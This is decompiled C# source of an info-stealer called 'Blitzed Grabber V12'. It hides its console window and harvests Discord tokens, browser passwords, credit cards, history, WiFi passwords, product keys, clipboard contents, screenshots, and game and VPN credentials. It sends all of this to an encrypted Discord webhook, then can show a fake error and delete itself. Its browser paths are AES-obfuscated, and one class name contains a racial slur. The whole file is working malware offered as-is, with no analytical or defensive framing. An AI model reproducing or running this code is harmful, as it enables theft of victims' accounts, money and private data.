using System;
using System.Collections.Generic;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Discord.Webhook;

namespace Stub
{
	// Token: 0x02000002 RID: 2
	public static class Program
	{
		// Token: 0x06000005 RID: 5
		[DllImport("kernel32.dll")]
		private static extern IntPtr GetConsoleWindow();

		// Token: 0x06000006 RID: 6
		[DllImport("user32.dll")]
		private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

		// Token: 0x06000007 RID: 7 RVA: 0x00002B00 File Offset: 0x00000D00
		public static async Task MainAsync()
		{
			WebhookObject webobj = new WebhookObject();
			webobj.content = "\n\n-------------------------------";
			webobj.AddEmbed(async delegate(EmbedBuilder builder)
			{
				builder.WithTitle("**BLITZED GRABBER V12**");
				builder.WithColor(Colors.Red);
				builder.WithDescription("Main Stealing");
				builder.WithAuthor("Kyanite", null);
				builder.WithFooter("gg/vape", "https://imgur.com/I1HftUj");
				builder.WithThumbnail("https://c.tenor.com/nT2wCwvPMdIAAAAd/illusion-polka-dots.gif");
				IntPtr consoleWindow = Program.GetConsoleWindow();
				if (Program.CheckDebugMode)
				{
					Program.ShowWindow(consoleWindow, 1);
				}
				else
				{
					Program.ShowWindow(consoleWindow, 0);
				}
				if (Program.CheckIP)
				{
					Console.WriteLine("Getting IP's");
					try
					{
						builder.AddField("Public IP", "```" + Smalls.GetIPAddress() + "```", false);
					}
					catch (Exception ex)
					{
						Console.WriteLine(ex.Message);
					}
					try
					{
						builder.AddField("Local IP", "```" + Smalls.GetLocalIPAddress() + "```", false);
					}
					catch
					{
					}
				}
				if (Program.CheckMAC)
				{
					try
					{
						builder.AddField("MAC Address", "```" + Smalls.GetMacAddress() + "```", false);
					}
					catch
					{
					}
				}
				if (Program.CheckDiscordTokens)
				{
					try
					{
						try
						{
							File.WriteAllText(Program.tempFolder + "\\Tokens.txt", "\n");
						}
						catch
						{
						}
						builder.AddField("Tokens", "```" + DiscordTokens.RetrieveTokens() + "```", false);
					}
					catch
					{
						try
						{
							DiscordTokens.SendTokens();
						}
						catch
						{
						}
					}
				}
				if (Program.CheckPasswords)
				{
					try
					{
						builder.AddField("Passwords", "```" + Password.passwords.retrievePasswords() + "```", false);
					}
					catch (Exception value)
					{
						try
						{
							Password.passwords.SendPasswordFile();
							Console.WriteLine(value);
						}
						catch
						{
						}
					}
				}
				if (Program.CheckCC)
				{
					try
					{
						builder.AddField("Credit Cards", "```" + Credit.GrabCCs() + "```", false);
					}
					catch (Exception)
					{
						builder.AddField("Credit Cards", "```No CCs Found```", false);
					}
				}
				if (Program.CheckHistory)
				{
					try
					{
						builder.AddField("History", "```" + History.GrabHistory() + "```", false);
					}
					catch
					{
						builder.AddField("History", "```Failed To Grab History Or Sent As File```", false);
					}
				}
				if (Program.CheckWifi)
				{
					try
					{
						string exploitDir = Wifi.Handler.ExploitDir;
						string[] profiles = Wifi.GetProfiles();
						foreach (string profile in profiles)
						{
							builder.AddField("WIFI Password", "```" + Wifi.GetWifiPassword(profile) + "```", false);
						}
					}
					catch
					{
					}
				}
				if (Program.CheckHWID)
				{
					try
					{
						ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select ProcessorId From Win32_processor");
						ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
						string text = "";
						using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectCollection.GetEnumerator())
						{
							if (enumerator.MoveNext())
							{
								ManagementObject managementObject = (ManagementObject)enumerator.Current;
								text = managementObject["ProcessorId"].ToString();
							}
						}
						builder.AddField("HWID", "```" + text.ToString() + "```", false);
					}
					catch (Exception ex2)
					{
						builder.AddField("HWID", "```" + ex2.Message + "```", false);
					}
				}
				if (Program.CheckProductKey)
				{
					try
					{
						builder.AddField("Product Key", "```" + ProductKey.GetWindowsProductKeyFromRegistry().ToString() + "```", false);
					}
					catch
					{
					}
				}
				if (Program.CheckCopiedText)
				{
					try
					{
						if (Clipboard.GetText().Length < 30)
						{
							builder.AddField("Copied Text", "```" + Clipboard.GetText() + "```", false);
						}
					}
					catch
					{
					}
				}
				if (Program.CheckSS)
				{
					try
					{
						Screenshot.SendScreenshot();
					}
					catch
					{
					}
				}
			});
			if (Program.CheckRoblox || Program.CheckMinecraft || Program.CheckSteam)
			{
				webobj.AddEmbed(async delegate(EmbedBuilder builder)
				{
					builder.WithTitle("**BLITZED GRABBER V12**");
					builder.WithColor(Colors.Red);
					builder.WithDescription("Gaming Accounts");
					builder.WithAuthor("Kyanite", null);
					builder.WithFooter("gg/vape", "https://imgur.com/I1HftUj");
					builder.WithThumbnail("https://c.tenor.com/nT2wCwvPMdIAAAAd/illusion-polka-dots.gif");
					if (Program.CheckMinecraft)
					{
						try
						{
							builder.AddField("Minecraft", "```" + Minecraft.GetMinecraft() + "```", false);
						}
						catch
						{
						}
					}
					if (Program.CheckRoblox)
					{
						try
						{
							builder.AddField("Roblox", "```" + Roblox.SendCookieAsFile() + "```", false);
						}
						catch
						{
						}
					}
					if (Program.CheckSteam)
					{
						try
						{
							builder.AddField("Steam", "```" + Steam.GetSteamSession() + "```", false);
						}
						catch
						{
						}
					}
				});
			}
			if (Program.CheckNord)
			{
				webobj.AddEmbed(async delegate(EmbedBuilder builder)
				{
					builder.WithTitle("**BLITZED GRABBER V12**");
					builder.WithColor(Colors.Red);
					builder.WithDescription("Accounts");
					builder.WithAuthor("Kyanite", null);
					builder.WithFooter("gg/vape", "https://imgur.com/I1HftUj");
					builder.WithThumbnail("https://c.tenor.com/nT2wCwvPMdIAAAAd/illusion-polka-dots.gif");
					if (Program.CheckNord)
					{
						try
						{
							builder.AddField("NordVPN", "```" + NordVPN.GrabNord() + "```", false);
						}
						catch
						{
						}
					}
				});
			}
			try
			{
				await new Webhook(Program.WebhookURL, null, null).SendAsync(webobj);
			}
			catch
			{
			}
			if (Program.CheckFakeError)
			{
				MessageBox.Show("e", "e", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			if (Program.CheckMelt)
			{
				try
				{
					Smalls.MeltStub();
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002B40 File Offset: 0x00000D40
		public static void Main()
		{
			Task.Run(async delegate()
			{
				await Program.MainAsync();
			}).GetAwaiter().GetResult();
		}

		// Token: 0x04000001 RID: 1
		public static string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

		// Token: 0x04000002 RID: 2
		public static string tempFolder = Environment.GetEnvironmentVariable("TEMP");

		// Token: 0x04000003 RID: 3
		public static string WebhookURL = Crypter.Niggerified.Unniggerify("MkiIOze71MnJamsToaE8h5YZ4o+0eHwViBL/xp84MisiPCpcw4bs/8pjJlbMW0yzXFSkRWYwar6PrN6f4bmxYvXnHw5ksWZGEseYqEgbQR3H+9qr8LscQZpfh29t6GsGW+ifosPaWClmtjbpotDSiSTdNzO6Io2wvb9cYDNa08f0HNgYl9m5rdcDSF1/DtMhEUu/oSEaKmFw26iAKlZV3y6LgNYicUSMabKIhSJu0nH4/qHdNC+YWxmnWSlrszf4", "rgekwsoabtsqnq");

		// Token: 0x04000004 RID: 4
		public static List<string> tokenscopped = new List<string>();

		// Token: 0x04000005 RID: 5
		public static bool CheckDebugMode = false;

		// Token: 0x04000006 RID: 6
		public static bool CheckPasswords = true;

		// Token: 0x04000007 RID: 7
		public static bool CheckDiscordTokens = true;

		// Token: 0x04000008 RID: 8
		public static bool CheckMinecraft = true;

		// Token: 0x04000009 RID: 9
		public static bool CheckWifi = true;

		// Token: 0x0400000A RID: 10
		public static bool CheckRoblox = true;

		// Token: 0x0400000B RID: 11
		public static bool CheckSS = true;

		// Token: 0x0400000C RID: 12
		public static bool CheckHistory = true;

		// Token: 0x0400000D RID: 13
		public static bool CheckNord = true;

		// Token: 0x0400000E RID: 14
		public static bool CheckFakeError = true;

		// Token: 0x0400000F RID: 15
		public static bool CheckCopiedText = false;

		// Token: 0x04000010 RID: 16
		public static bool CheckHWID = true;

		// Token: 0x04000011 RID: 17
		public static bool CheckIP = true;

		// Token: 0x04000012 RID: 18
		public static bool CheckCC = true;

		// Token: 0x04000013 RID: 19
		public static bool CheckSteam = true;

		// Token: 0x04000014 RID: 20
		public static bool CheckMAC = true;

		// Token: 0x04000015 RID: 21
		public static bool CheckProductKey = true;

		// Token: 0x04000016 RID: 22
		public static bool CheckMelt = false;

		// Token: 0x02000003 RID: 3
		internal sealed class Paths
		{
			// Token: 0x0400001B RID: 27
			public static string[] sChromiumPswPaths = new string[]
			{
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					191,
					144,
					50,
					4,
					176,
					103,
					41,
					226,
					163,
					145,
					184,
					198,
					37,
					147,
					201,
					246,
					15,
					80,
					188,
					217,
					224,
					55,
					94,
					195,
					60,
					36,
					195,
					150,
					34,
					219,
					225,
					21
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					66,
					190,
					240,
					189,
					196,
					112,
					68,
					209,
					120,
					66,
					32,
					128,
					51,
					187,
					11,
					106,
					133,
					186,
					29,
					203,
					189,
					184,
					20,
					80,
					22,
					110,
					247,
					203,
					200,
					139,
					145,
					252
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					235,
					71,
					60,
					105,
					141,
					89,
					135,
					64,
					7,
					55,
					22,
					242,
					173,
					137,
					97,
					111,
					206,
					79,
					207,
					177,
					151,
					51,
					114,
					222,
					203,
					93,
					6,
					206,
					108,
					141,
					97,
					221
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					73,
					24,
					163,
					202,
					103,
					163,
					250,
					131,
					58,
					254,
					109,
					200,
					0,
					101,
					128,
					192,
					177,
					205,
					31,
					137,
					135,
					207,
					160,
					228,
					106,
					123,
					85,
					109,
					55,
					byte.MaxValue,
					16,
					57
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					94,
					125,
					152,
					164,
					215,
					224,
					18,
					60,
					32,
					98,
					147,
					169,
					150,
					48,
					141,
					211,
					192,
					129,
					56,
					148,
					7,
					104,
					31,
					144,
					122,
					249,
					59,
					25,
					71,
					162,
					241,
					69,
					98,
					84,
					243,
					115,
					233,
					26,
					59,
					183,
					252,
					7,
					8,
					237,
					21,
					222,
					0,
					157
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					139,
					161,
					110,
					219,
					171,
					17,
					246,
					186,
					22,
					213,
					4,
					215,
					141,
					253,
					17,
					173,
					215,
					53,
					171,
					41,
					246,
					99,
					184,
					29,
					177,
					20,
					156,
					97,
					116,
					105,
					188,
					242
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					190,
					77,
					154,
					38,
					44,
					145,
					237,
					67,
					174,
					9,
					133,
					3,
					58,
					246,
					93,
					41,
					23,
					35,
					235,
					203,
					108,
					171,
					65,
					71,
					56,
					233,
					66,
					13,
					202,
					51,
					79,
					41
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					62,
					210,
					240,
					33,
					118,
					184,
					243,
					141,
					77,
					133,
					0,
					235,
					139,
					86,
					39,
					25,
					137,
					185,
					88,
					124,
					221,
					174,
					169,
					88,
					91,
					11,
					213,
					207,
					43,
					146,
					75,
					243
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					62,
					0,
					196,
					29,
					187,
					130,
					95,
					54,
					171,
					116,
					232,
					214,
					233,
					238,
					169,
					220,
					87,
					81,
					58,
					192,
					55,
					32,
					9,
					66,
					192,
					71,
					163,
					194,
					155,
					180,
					1,
					100
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					248,
					132,
					208,
					253,
					161,
					159,
					142,
					173,
					129,
					48,
					103,
					48,
					159,
					71,
					82,
					190,
					211,
					175,
					88,
					121,
					54,
					47,
					62,
					205,
					43,
					35,
					160,
					92,
					160,
					146,
					80,
					219
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					160,
					221,
					244,
					224,
					234,
					124,
					235,
					177,
					76,
					91,
					97,
					50,
					47,
					65,
					63,
					227,
					74,
					50,
					249,
					90,
					53,
					48,
					13,
					166,
					106,
					36,
					144,
					79,
					133,
					138,
					58,
					173
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					14,
					78,
					82,
					180,
					74,
					84,
					229,
					48,
					85,
					125,
					151,
					44,
					44,
					245,
					236,
					69,
					139,
					52,
					31,
					12,
					236,
					152,
					84,
					192,
					7,
					253,
					207,
					160,
					82,
					205,
					206,
					216
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					80,
					37,
					192,
					228,
					231,
					129,
					178,
					111,
					104,
					225,
					219,
					4,
					152,
					121,
					224,
					204,
					47,
					223,
					134,
					64,
					65,
					137,
					96,
					90,
					39,
					174,
					0,
					233,
					231,
					244,
					222,
					81
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					193,
					191,
					13,
					199,
					192,
					122,
					144,
					200,
					83,
					128,
					6,
					28,
					13,
					132,
					90,
					7,
					29,
					217,
					70,
					36,
					4,
					149,
					132,
					62,
					242,
					153,
					217,
					247,
					182,
					13,
					180,
					100
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					191,
					8,
					54,
					18,
					102,
					8,
					237,
					252,
					81,
					68,
					237,
					30,
					28,
					29,
					171,
					167,
					37,
					11,
					209,
					77,
					139,
					81,
					1,
					98,
					185,
					217,
					150,
					213,
					121,
					123,
					68,
					82,
					53,
					254,
					128,
					68,
					133,
					32,
					78,
					35,
					53,
					212,
					98,
					35,
					135,
					101,
					229,
					112,
					43,
					179,
					17,
					51,
					150,
					27,
					145,
					232,
					59,
					202,
					27,
					195,
					245,
					91,
					244,
					53
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					124,
					243,
					34,
					12,
					158,
					74,
					249,
					212,
					5,
					90,
					133,
					132,
					35,
					216,
					217,
					22,
					217,
					55,
					243,
					252,
					51,
					87,
					241,
					238,
					86,
					244,
					62,
					37,
					95,
					154,
					18,
					210,
					62,
					206,
					164,
					16,
					182,
					192,
					15,
					85,
					48,
					23,
					118,
					190,
					110,
					166,
					231,
					219
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					112,
					174,
					206,
					195,
					60,
					254,
					140,
					154,
					222,
					29,
					174,
					131,
					97,
					154,
					190,
					225,
					101,
					102,
					44,
					184,
					116,
					3,
					222,
					149,
					173,
					77,
					23,
					224,
					108,
					61,
					110,
					83
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					168,
					208,
					166,
					82,
					192,
					153,
					44,
					149,
					17,
					233,
					52,
					199,
					126,
					180,
					93,
					48,
					18,
					157,
					146,
					139,
					52,
					61,
					229,
					244,
					233,
					177,
					174,
					202,
					13,
					20,
					68,
					248
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					15,
					171,
					27,
					72,
					143,
					86,
					53,
					189,
					140,
					83,
					1,
					120,
					66,
					90,
					66,
					28,
					128,
					139,
					207,
					118,
					135,
					205,
					39,
					142,
					89,
					231,
					22,
					111,
					194,
					199,
					245,
					22
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					64,
					252,
					183,
					118,
					9,
					181,
					137,
					115,
					42,
					20,
					107,
					204,
					169,
					49,
					101,
					240,
					160,
					210,
					28,
					182,
					65,
					1,
					170,
					136,
					179,
					86,
					242,
					2,
					40,
					236,
					39,
					92
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					163,
					202,
					80,
					117,
					26,
					124,
					142,
					96,
					200,
					150,
					88,
					164,
					24,
					244,
					151,
					69,
					200,
					214,
					2,
					103,
					223,
					49,
					243,
					222,
					70,
					137,
					79,
					85,
					208,
					132,
					160,
					180
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					190,
					180,
					48,
					187,
					130,
					241,
					22,
					142,
					148,
					81,
					86,
					118,
					125,
					198,
					67,
					134,
					168,
					170,
					218,
					153,
					252,
					65,
					45,
					99,
					146,
					136,
					184,
					169,
					8,
					176,
					254,
					158
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					134,
					62,
					128,
					238,
					85,
					244,
					104,
					139,
					79,
					49,
					203,
					166,
					37,
					19,
					150,
					80,
					195,
					12,
					211,
					168,
					230,
					85,
					8,
					141,
					82,
					13,
					200,
					163,
					193,
					61,
					249,
					18
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					189,
					176,
					161,
					91,
					124,
					7,
					222,
					38,
					230,
					226,
					175,
					16,
					213,
					160,
					182,
					221,
					133,
					88,
					75,
					233,
					51,
					39,
					227,
					90,
					53,
					56,
					98,
					251,
					118,
					191,
					198,
					4,
					38,
					3,
					145,
					152,
					83,
					170,
					23,
					225,
					66,
					207,
					208,
					132,
					167,
					27,
					63,
					43
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					13,
					6,
					120,
					217,
					132,
					74,
					167,
					141,
					165,
					239,
					104,
					198,
					115,
					212,
					98,
					108,
					230,
					36,
					207,
					96,
					112,
					142,
					221,
					116,
					224,
					149,
					170,
					246,
					80,
					191,
					143,
					130
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					59,
					208,
					82,
					153,
					38,
					145,
					53,
					186,
					128,
					79,
					177,
					14,
					101,
					235,
					46,
					148,
					230,
					52,
					225,
					181,
					155,
					81,
					183,
					213,
					37,
					54,
					26,
					129,
					9,
					171,
					114,
					201
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					210,
					110,
					31,
					64,
					140,
					5,
					137,
					32,
					239,
					70,
					133,
					139,
					182,
					28,
					116,
					149,
					137,
					179,
					177,
					211,
					237,
					32,
					56,
					74,
					238,
					183,
					94,
					93,
					153,
					52,
					180,
					166
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					127,
					26,
					51,
					8,
					51,
					33,
					160,
					156,
					24,
					156,
					118,
					176,
					53,
					117,
					49,
					254,
					byte.MaxValue,
					109,
					181,
					189,
					202,
					185,
					182,
					67,
					39,
					65,
					51,
					52,
					173,
					18,
					238,
					176
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					199,
					54,
					29,
					56,
					170,
					241,
					14,
					100,
					162,
					6,
					72,
					161,
					113,
					24,
					82,
					202,
					17,
					115,
					136,
					234,
					7,
					212,
					113,
					6,
					151,
					135,
					75,
					247,
					247,
					173,
					203,
					24
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					83,
					72,
					133,
					227,
					83,
					110,
					30,
					229,
					236,
					41,
					214,
					6,
					199,
					29,
					46,
					177,
					241,
					54,
					120,
					70,
					151,
					178,
					31,
					141,
					61,
					90,
					213,
					35,
					23,
					246,
					13,
					83
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					104,
					246,
					234,
					64,
					237,
					165,
					148,
					53,
					5,
					137,
					111,
					113,
					171,
					60,
					134,
					245,
					123,
					46,
					6,
					132,
					64,
					48,
					18,
					15,
					251,
					4,
					115,
					37,
					170,
					131,
					50,
					128
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					133,
					151,
					179,
					byte.MaxValue,
					133,
					211,
					180,
					66,
					84,
					153,
					153,
					102,
					25,
					119,
					175,
					75,
					37,
					11,
					232,
					242,
					215,
					134,
					15,
					104,
					97,
					24,
					243,
					15,
					72,
					21,
					214,
					148
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					101,
					40,
					56,
					105,
					89,
					211,
					223,
					54,
					3,
					104,
					25,
					89,
					1,
					122,
					183,
					190,
					84,
					174,
					204,
					213,
					56,
					142,
					216,
					145,
					19,
					148,
					221,
					119,
					63,
					0,
					14,
					109
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					175,
					246,
					73,
					246,
					49,
					254,
					11,
					23,
					218,
					203,
					11,
					198,
					89,
					205,
					176,
					84,
					56,
					68,
					227,
					191,
					99,
					91,
					219,
					129,
					239,
					50,
					148,
					130,
					220,
					188,
					164,
					21
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					75,
					24,
					125,
					65,
					43,
					53,
					196,
					162,
					16,
					125,
					167,
					152,
					46,
					91,
					169,
					88,
					249,
					110,
					125,
					80,
					24,
					9,
					189,
					218,
					64,
					40,
					44,
					44,
					182,
					21,
					14,
					72,
					150,
					141,
					179,
					43,
					1,
					75,
					180,
					171,
					191,
					237,
					98,
					81,
					222,
					4,
					48,
					130
				})
			};

			// Token: 0x0400001C RID: 28
			public static string[] sGeckoBrowserPaths = new string[]
			{
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					25,
					165,
					254,
					213,
					23,
					104,
					22,
					140,
					50,
					180,
					13,
					111,
					144,
					203,
					43,
					22,
					130,
					192,
					203,
					173,
					216,
					174,
					203,
					198,
					119,
					247,
					195,
					48,
					28,
					15,
					102,
					251
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					57,
					61,
					215,
					94,
					116,
					76,
					131,
					196,
					108,
					135,
					85,
					159,
					219,
					37,
					127,
					47
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					131,
					14,
					byte.MaxValue,
					168,
					2,
					46,
					205,
					11,
					17,
					125,
					39,
					71,
					131,
					241,
					39,
					192
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					78,
					198,
					187,
					164,
					195,
					98,
					111,
					181,
					201,
					137,
					136,
					6,
					94,
					66,
					48,
					57
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					15,
					197,
					238,
					219,
					54,
					25,
					176,
					66,
					84,
					247,
					8,
					76,
					207,
					35,
					202,
					142,
					147,
					45,
					233,
					227,
					100,
					60,
					238,
					136,
					160,
					192,
					140,
					59,
					107,
					214,
					244,
					202
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					153,
					86,
					193,
					227,
					188,
					184,
					28,
					41,
					79,
					37,
					113,
					236,
					3,
					244,
					237,
					150,
					134,
					53,
					212,
					66,
					69,
					82,
					197,
					61,
					225,
					15,
					130,
					151,
					189,
					246,
					126,
					205
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					196,
					189,
					143,
					56,
					114,
					249,
					19,
					12,
					92,
					176,
					156,
					66,
					203,
					221,
					53,
					72,
					131,
					177,
					110,
					160,
					95,
					218,
					63,
					31,
					217,
					46,
					132,
					4,
					211,
					175,
					216,
					239
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					156,
					253,
					178,
					143,
					188,
					39,
					142,
					60,
					241,
					99,
					247,
					116,
					211,
					99,
					5,
					119,
					40,
					243,
					72,
					59,
					0,
					175,
					243,
					243,
					94,
					202,
					67,
					206,
					126,
					176,
					47,
					182,
					145,
					87,
					37,
					85,
					76,
					138,
					57,
					238,
					162,
					167,
					29,
					248,
					230,
					180,
					133,
					57
				})
			};

			// Token: 0x0400001D RID: 29
			public static string EdgePath = Program.Paths.StringsCrypt.Decrypt(new byte[]
			{
				156,
				195,
				223,
				143,
				60,
				17,
				189,
				byte.MaxValue,
				52,
				135,
				177,
				35,
				20,
				86,
				6,
				119,
				131,
				100,
				33,
				246,
				174,
				234,
				146,
				72,
				65,
				90,
				212,
				244,
				233,
				203,
				145,
				176
			});

			// Token: 0x0400001E RID: 30
			public static string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

			// Token: 0x0400001F RID: 31
			public static string lappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

			// Token: 0x02000004 RID: 4
			internal sealed class StringsCrypt
			{
				// Token: 0x06000010 RID: 16 RVA: 0x000031F8 File Offset: 0x000013F8
				public static string Decrypt(byte[] bytesToBeDecrypted)
				{
					byte[] bytes = null;
					using (MemoryStream memoryStream = new MemoryStream())
					{
						using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
						{
							rijndaelManaged.KeySize = 256;
							rijndaelManaged.BlockSize = 128;
							Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(Program.Paths.StringsCrypt.cryptKey, Program.Paths.StringsCrypt.saltBytes, 1000);
							rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
							rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
							rijndaelManaged.Mode = CipherMode.CBC;
							using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
							{
								cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
								cryptoStream.Close();
							}
							bytes = memoryStream.ToArray();
						}
					}
					return Encoding.UTF8.GetString(bytes);
				}

				// Token: 0x06000011 RID: 17 RVA: 0x000026D1 File Offset: 0x000008D1
				public static string DecryptConfig(string value)
				{
					if (string.IsNullOrEmpty(value))
					{
						return "";
					}
					if (!value.StartsWith("ENCRYPTED:"))
					{
						return value;
					}
					return Program.Paths.StringsCrypt.Decrypt(Convert.FromBase64String(value.Replace("ENCRYPTED:", "")));
				}

				// Token: 0x04000020 RID: 32
				private static readonly byte[] saltBytes = new byte[]
				{
					byte.MaxValue,
					64,
					191,
					111,
					23,
					3,
					113,
					119,
					231,
					121,
					252,
					112,
					79,
					32,
					114,
					156
				};

				// Token: 0x04000021 RID: 33
				private static readonly byte[] cryptKey = new byte[]
				{
					104,
					116,
					116,
					112,
					115,
					58,
					47,
					47,
					103,
					105,
					116,
					104,
					117,
					98,
					46,
					99,
					111,
					109,
					47,
					76,
					105,
					109,
					101,
					114,
					66,
					111,
					121,
					47,
					83,
					116,
					111,
					114,
					109,
					75,
					105,
					116,
					116,
					121
				};

				// Token: 0x04000022 RID: 34
				public static string github = Encoding.UTF8.GetString(Program.Paths.StringsCrypt.cryptKey);

				// Token: 0x04000023 RID: 35
				public static string AnonApiToken = Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					169,
					182,
					79,
					179,
					252,
					54,
					138,
					148,
					167,
					99,
					216,
					216,
					199,
					219,
					10,
					249,
					131,
					166,
					170,
					145,
					237,
					248,
					142,
					78,
					196,
					137,
					101,
					62,
					142,
					107,
					245,
					134
				});
			}
		}
	}
}
